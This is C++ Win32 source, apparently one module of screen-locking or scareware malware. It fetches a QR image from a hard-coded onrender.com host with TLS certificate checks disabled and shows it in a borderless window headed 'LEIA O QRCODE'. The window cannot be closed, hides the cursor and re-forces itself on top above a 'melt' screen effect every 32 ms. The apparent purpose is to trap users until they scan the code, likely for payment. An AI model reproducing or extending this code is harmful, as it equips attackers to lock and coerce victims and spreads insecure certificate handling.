#include "qr_popup.h"
#include "globals.h"
#include <winhttp.h>
#include <olectl.h>
#include <gdiplus.h>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "gdiplus.lib")

static const wchar_t QR_CLS[]  = L"QrPopupCls";
static const wchar_t QR_HOST[] = L"donwload-k48e.onrender.com";
static const wchar_t QR_PATH[] = L"/qrCode";

// ─── Fetch da imagem em memória via WinHTTP ────────────────────────────────────
static std::vector<BYTE> FetchImageBytes() {
    std::vector<BYTE> result;

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return result;

    HINTERNET hConn = WinHttpConnect(hSession, QR_HOST,
        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConn) { WinHttpCloseHandle(hSession); return result; }

    HINTERNET hReq = WinHttpOpenRequest(hConn, L"GET", QR_PATH,
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    if (!hReq) {
        WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession); return result;
    }

    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
    WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    DWORD timeout = 8000;
    WinHttpSetOption(hReq, WINHTTP_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hReq, WINHTTP_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
    WinHttpSetOption(hReq, WINHTTP_OPTION_SEND_TIMEOUT,    &timeout, sizeof(timeout));

    if (!WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                            WINHTTP_NO_REQUEST_DATA, 0, 0, 0) ||
        !WinHttpReceiveResponse(hReq, nullptr)) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn);
        WinHttpCloseHandle(hSession); return result;
    }

    DWORD statusCode = 0, statusLen = sizeof(statusCode);
    WinHttpQueryHeaders(hReq,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusLen,
        WINHTTP_NO_HEADER_INDEX);
    if (statusCode != 200) {
        WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn);
        WinHttpCloseHandle(hSession); return result;
    }

    DWORD avail = 0, read = 0;
    while (WinHttpQueryDataAvailable(hReq, &avail) && avail > 0) {
        size_t oldSize = result.size();
        result.resize(oldSize + avail);
        WinHttpReadData(hReq, result.data() + oldSize, avail, &read);
        result.resize(oldSize + read);
    }

    WinHttpCloseHandle(hReq); WinHttpCloseHandle(hConn); WinHttpCloseHandle(hSession);
    return result;
}

// ─── Retry até ter internet (tenta a cada 5s por até 2 minutos) ───────────────
static std::vector<BYTE> FetchWithRetry() {
    for (int i = 0; i < 24 && g_running; i++) {
        auto bytes = FetchImageBytes();
        if (!bytes.empty()) return bytes;
        Sleep(5000);
    }
    return {};
}

// ─── Cria Gdiplus::Image a partir de bytes em memória ─────────────────────────
static Gdiplus::Image* LoadImageFromBytes(const std::vector<BYTE>& bytes) {
    if (bytes.empty()) return nullptr;
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, bytes.size());
    if (!hMem) return nullptr;
    void* pMem = GlobalLock(hMem);
    memcpy(pMem, bytes.data(), bytes.size());
    GlobalUnlock(hMem);
    IStream* pStream = nullptr;
    if (FAILED(CreateStreamOnHGlobal(hMem, TRUE, &pStream)))
        { GlobalFree(hMem); return nullptr; }
    Gdiplus::Image* img = Gdiplus::Image::FromStream(pStream);
    pStream->Release();
    if (!img || img->GetLastStatus() != Gdiplus::Ok)
        { delete img; return nullptr; }
    return img;
}

// ─── Dados do popup ────────────────────────────────────────────────────────────
struct QrData { Gdiplus::Image* img; };

// ─── Layout do card ───────────────────────────────────────────────────────────
static const int HEADER_H = 48;  // "leia o qrcode"
static const int FOOTER_H = 40;  // "by GMzin"
static const int CARD_W   = 440;
static const int CARD_H   = 540; // header + qr(452) + footer

static LRESULT CALLBACK QrWndProc(HWND hWnd, UINT msg, WPARAM wp, LPARAM lp) {
    switch (msg) {
    case WM_CREATE:
        SetWindowLongPtrW(hWnd, GWLP_USERDATA,
            (LONG_PTR)((CREATESTRUCT*)lp)->lpCreateParams);
        return 0;

    case WM_ERASEBKGND: return 1;

    case WM_PAINT: {
        auto* d = (QrData*)GetWindowLongPtrW(hWnd, GWLP_USERDATA);
        PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &ps);
        RECT rc; GetClientRect(hWnd, &rc);
        int W = rc.right, H = rc.bottom;

        Gdiplus::Graphics g(hdc);
        g.SetSmoothingMode(Gdiplus::SmoothingModeAntiAlias);
        g.SetTextRenderingHint(Gdiplus::TextRenderingHintClearTypeGridFit);

        // ── Fundo branco total ────────────────────────────────────────────────
        Gdiplus::SolidBrush white(Gdiplus::Color(255,255,255,255));
        g.FillRectangle(&white, 0, 0, W, H);

        // ── Header: "leia o qrcode" ───────────────────────────────────────────
        {
            Gdiplus::SolidBrush headerBg(Gdiplus::Color(255, 30, 30, 30));
            g.FillRectangle(&headerBg, 0, 0, W, HEADER_H);

            Gdiplus::FontFamily ff(L"Arial");
            Gdiplus::Font font(&ff, 16, Gdiplus::FontStyleBold, Gdiplus::UnitPixel);
            Gdiplus::SolidBrush textBr(Gdiplus::Color(255,255,255,255));
            Gdiplus::StringFormat fmt;
            fmt.SetAlignment(Gdiplus::StringAlignmentCenter);
            fmt.SetLineAlignment(Gdiplus::StringAlignmentCenter);
            Gdiplus::RectF headerRect(0, 0, (float)W, (float)HEADER_H);
            g.DrawString(L"\u26a0  LEIA O QRCODE  \u26a0", -1, &font, headerRect, &fmt, &textBr);
        }

        // ── Área do QR code ───────────────────────────────────────────────────
        {
            int qrY = HEADER_H;
            int qrH = H - HEADER_H - FOOTER_H;

            if (d && d->img) {
                g.SetInterpolationMode(Gdiplus::InterpolationModeHighQualityBicubic);
                UINT iw = d->img->GetWidth(), ih = d->img->GetHeight();
                int dw = W - 16, dh = qrH - 16;
                if (iw > 0 && ih > 0) {
                    double ar = (double)iw / ih;
                    if ((double)dw / dh > ar) dw = (int)(dh * ar);
                    else                      dh = (int)(dw / ar);
                }
                int ox = (W - dw) / 2;
                int oy = qrY + (qrH - dh) / 2;
                g.DrawImage(d->img, ox, oy, dw, dh);
            } else {
                // Sem internet: caixa cinza com texto
                Gdiplus::SolidBrush grayBg(Gdiplus::Color(255,240,240,240));
                g.FillRectangle(&grayBg, 8, qrY+8, W-16, qrH-16);
                Gdiplus::FontFamily ff(L"Arial");
                Gdiplus::Font font(&ff, 14, Gdiplus::FontStyleBold, Gdiplus::UnitPixel);
                Gdiplus::SolidBrush gray(Gdiplus::Color(255,150,150,150));
                Gdiplus::StringFormat fmt;
                fmt.SetAlignment(Gdiplus::StringAlignmentCenter);
                fmt.SetLineAlignment(Gdiplus::StringAlignmentCenter);
                Gdiplus::RectF qrRect(8, (float)(qrY+8), (float)(W-16), (float)(qrH-16));
                g.DrawString(L"conectando...", -1, &font, qrRect, &fmt, &gray);
            }
        }

        // ── Footer: "by GMzin" ────────────────────────────────────────────────
        {
            Gdiplus::SolidBrush footerBg(Gdiplus::Color(255, 30, 30, 30));
            g.FillRectangle(&footerBg, 0, H - FOOTER_H, W, FOOTER_H);

            Gdiplus::FontFamily ff(L"Arial");
            Gdiplus::Font font(&ff, 13, Gdiplus::FontStyleBold, Gdiplus::UnitPixel);
            Gdiplus::SolidBrush textBr(Gdiplus::Color(255,180,180,180));
            Gdiplus::StringFormat fmt;
            fmt.SetAlignment(Gdiplus::StringAlignmentCenter);
            fmt.SetLineAlignment(Gdiplus::StringAlignmentCenter);
            Gdiplus::RectF footerRect(0, (float)(H - FOOTER_H), (float)W, (float)FOOTER_H);
            g.DrawString(L"by GMzin", -1, &font, footerRect, &fmt, &textBr);
        }

        // ── Borda fina escura ─────────────────────────────────────────────────
        Gdiplus::Pen border(Gdiplus::Color(255,50,50,50), 2);
        g.DrawRectangle(&border, 1, 1, W-2, H-2);

        EndPaint(hWnd, &ps); return 0;
    }

    case WM_SETCURSOR:
        SetCursor(nullptr);
        return TRUE;

    case WM_CLOSE: return 0;
    case WM_SYSCOMMAND:
        if ((wp & 0xFFF0) == SC_CLOSE) return 0;
        break;
    }
    return DefWindowProcW(hWnd, msg, wp, lp);
}

void QrPopupThread() {
    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    Gdiplus::GdiplusStartupInput gdipInput;
    ULONG_PTR gdipToken;
    Gdiplus::GdiplusStartup(&gdipToken, &gdipInput, nullptr);

    // Registra classe — cursor NULL para esconder o mouse
    WNDCLASSW wc = {};
    wc.lpfnWndProc   = QrWndProc;
    wc.hInstance     = GetModuleHandleW(nullptr);
    wc.lpszClassName = QR_CLS;
    wc.hCursor       = nullptr;
    RegisterClassW(&wc);

    // Popup centralizado — aparece imediatamente sem imagem (conectando...)
    int px = (SW - CARD_W) / 2, py = (SH - CARD_H) / 2;

    QrData data = { nullptr };

    HWND hw = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        QR_CLS, L"", WS_POPUP,
        px, py, CARD_W, CARD_H,
        nullptr, nullptr, GetModuleHandleW(nullptr), (LPVOID)&data);

    if (!hw) goto cleanup;

    SetWindowPos(hw, HWND_TOPMOST, px, py, CARD_W, CARD_H,
        SWP_SHOWWINDOW | SWP_NOACTIVATE | SWP_NOSENDCHANGING);
    UpdateWindow(hw);

    // Busca imagem em thread separada e atualiza o card quando chegar
    std::thread([&data, hw]() {
        auto bytes = FetchWithRetry();
        data.img = LoadImageFromBytes(bytes);
        // Redesenha o card com a imagem
        if (hw && IsWindow(hw))
            InvalidateRect(hw, nullptr, FALSE);
    }).detach();

    {
        MSG m = {};
        while (g_running) {
            while (PeekMessageW(&m, nullptr, 0, 0, PM_REMOVE)) {
                if (m.message == WM_QUIT) { g_running = false; break; }
                TranslateMessage(&m); DispatchMessageW(&m);
            }
            // Mantém QR acima do melt (melt não reasserta → sem conflito)
            SetWindowPos(hw, HWND_TOPMOST, 0,0,0,0,
                SWP_NOMOVE|SWP_NOSIZE|SWP_NOACTIVATE|SWP_NOREDRAW);
            Sleep(32);
        }
    }

    DestroyWindow(hw);

cleanup:
    delete data.img;
    UnregisterClassW(QR_CLS, GetModuleHandleW(nullptr));
    Gdiplus::GdiplusShutdown(gdipToken);
    CoUninitialize();
}
